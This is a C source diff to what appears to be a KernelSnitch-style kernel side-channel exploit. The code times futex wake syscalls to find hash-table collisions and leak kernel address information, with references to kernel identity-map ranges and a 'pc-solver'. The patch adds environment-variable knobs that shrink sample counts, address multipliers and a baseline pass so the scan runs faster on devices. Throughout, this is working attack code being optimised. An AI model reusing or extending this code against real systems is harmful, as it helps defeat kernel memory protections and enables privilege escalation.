@@ -28,6 +28,13 @@
 #endif
 #define APPENDED_FUTEXES 4096
 #define MULITPLE 4
+/* Cost knobs for the collision scan (see docs/specs/kernelsnitch-pc-solver.md).
+ * total = 256*cpu_cnt*collisions*mult addresses are measured, so the scan is
+ * dominated by address count x passes x samples.  Defaults reproduce the
+ * upstream values; the env overrides exist because a full 10-minute scan per
+ * cycle is what makes device testing impractical. */
+static size_t ks_total_mult = MULITPLE;
+static int ks_pile2_baseline = 1;
 #if defined(__INTEL) || defined(__AMD)
 #define IDENTITY_START 0xffff888000000000ULL
 #define IDENTITY_END   0xffffc88000000000ULL
@@ -140,7 +147,6 @@ struct inc_arg {
 static void *__do_increase(void *arg)
 {
     struct inc_arg *inc_arg = (struct inc_arg *)arg;
-    struct kernelsnitch_shared_state *ks = inc_arg->ks;
     size_t core = inc_arg->core;
     /* pin this piled waiter away from the measuring core to avoid preempting it */
     cpu_set_t cpuset;
@@ -197,6 +203,10 @@ static void __increase(struct kernelsnitch_shared_state *ks, size_t id, size_t a
  */
 #define REPEAT_MEASUREMENT 128
 #define AVERAGE (1<<3)
+/* Only the mean of the lowest AVERAGE samples is kept, so the sample count is
+ * a noise margin, not part of the statistic: 32 samples keeps the shape at a
+ * quarter of the cost. */
+static size_t ks_measure_reps = REPEAT_MEASUREMENT;
 static int __compare(const void *a, const void *b)
 {
     return (*(size_t *)a - *(size_t *)b);
@@ -214,17 +224,20 @@ static size_t __measure(size_t futex_addr)
     size_t time = 0;
     // do some simple signal processing and reject bad ones
     size_t __times[REPEAT_MEASUREMENT];
-    for (size_t l = 0; l < REPEAT_MEASUREMENT; ++l) {
+    size_t reps = ks_measure_reps;
+    if (reps == 0 || reps > REPEAT_MEASUREMENT) reps = REPEAT_MEASUREMENT;
+    for (size_t l = 0; l < reps; ++l) {
         sched_yield();
         t0 = rdtsc_begin();
         SYSCHK(__futex((unsigned int *)futex_addr, FUTEX_WAKE_PRIVATE, 0, NULL, NULL, 0));
         t1 = rdtsc_end();
         __times[l] = t1 - t0;
     }
-    qsort(__times, REPEAT_MEASUREMENT, sizeof(size_t), __compare);
-    for (size_t l = 0; l < AVERAGE; ++l)
+    qsort(__times, reps, sizeof(size_t), __compare);
+    size_t avg = AVERAGE < reps ? AVERAGE : reps;
+    for (size_t l = 0; l < avg; ++l)
         time += __times[l];
-    time /= AVERAGE;
+    time /= avg;
     return time;
 }
 
@@ -344,8 +357,18 @@ struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size
     ks->dbg_any_match = 0;
 
     // unfortunately I have to use a the kernelsnitch_shared_state and mmap(shared) as find collisions and bruteforce might be in different processes!!!
+    {
+      const char *v;
+      if ((v = getenv("KS_MEASURE_REPS")) && *v) ks_measure_reps = strtoul(v, NULL, 0);
+      if ((v = getenv("KS_TOTAL_MULT")) && *v) ks_total_mult = strtoul(v, NULL, 0);
+      if ((v = getenv("KS_PILE2_BASELINE")) && *v) ks_pile2_baseline = atoi(v);
+      if (ks_total_mult < 1) ks_total_mult = 1;
+      if (ks_measure_reps == 0) ks_measure_reps = REPEAT_MEASUREMENT;
+      pr_info("KS_COST reps=%zu mult=%zu pile2_baseline=%d\n",
+              ks_measure_reps, ks_total_mult, ks_pile2_baseline);
+    }
     ks->futex_hash_table_size = 256*ks->cpu_cnt;
-    ks->total_futexes = ks->futex_hash_table_size*ks->collisions*MULITPLE;
+    ks->total_futexes = ks->futex_hash_table_size*ks->collisions*ks_total_mult;
     ks->times = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->total_futexes, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
     ks->t_before = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->total_futexes, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
     ks->tids = (pthread_t *)SYSCHK(mmap(0, sizeof(pthread_t)*ks->thread_cnt, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
@@ -504,11 +527,16 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
                 *(volatile unsigned int *)ks->pile2_anchor);
     usleep(2000);
 
-    for (size_t i = 2; i < total; ++i) {
-        id = (i * KS_PAGE_SIZE) | (i * 8 % KS_PAGE_SIZE);
-        if (id >= FUTEX_SZ)
-            break;
-        ks->t_before2[i] = __measure((size_t)&ks->futexes[id]);
+    /* A second quiet-baseline pass re-measures the same addresses pile 1
+     * already baselined.  The absolute threshold and the two-pile intersection
+     * both reject noise, so this pass is optional (KS_PILE2_BASELINE=0). */
+    if (ks_pile2_baseline) {
+        for (size_t i = 2; i < total; ++i) {
+            id = (i * KS_PAGE_SIZE) | (i * 8 % KS_PAGE_SIZE);
+            if (id >= FUTEX_SZ)
+                break;
+            ks->t_before2[i] = __measure((size_t)&ks->futexes[id]);
+        }
     }
     if (__increase_addr(ks, (unsigned int *)ks->pile2_anchor, APPENDED_FUTEXES,
                         FUTEX_WAIT_PRIVATE, 0) != 0) {
@@ -525,7 +553,7 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
         futex_addr = (size_t)&ks->futexes[id];
         ks->times2[i] = __measure(futex_addr);
         if (ks->times2[i] > threshold &&
-            ks->times2[i] > ks->t_before2[i] * 3) {
+            (!ks_pile2_baseline || ks->times2[i] > ks->t_before2[i] * 3)) {
             if (ks->candidate2_count < ks->candidate_max) {
                 ks->candidate2_idx[ks->candidate2_count++] = id;
             }
